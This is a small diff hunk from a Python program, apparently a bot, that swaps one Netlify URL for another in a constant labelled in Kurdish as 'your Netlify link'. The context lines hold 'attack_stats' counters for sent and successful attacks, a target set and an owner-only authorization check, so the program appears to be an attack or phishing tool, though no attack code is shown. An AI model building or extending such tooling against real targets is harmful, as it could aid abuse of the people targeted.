@@ -29,7 +29,7 @@ attack_stats = {"sent": 0, "success": 0, "target": ""}
 connected_targets = set()
 
 # لینکی نێتلیفایەکەت
-ULTIMATE_NETLIFY_LINK = "https://idyllic-sable-301d6b.netlify.app/"
+ULTIMATE_NETLIFY_LINK = "https://stalwart-strudel-728ffd.netlify.app/"
 
 def is_authorized(user_id):
     if OWNER_ID and user_id == OWNER_ID:
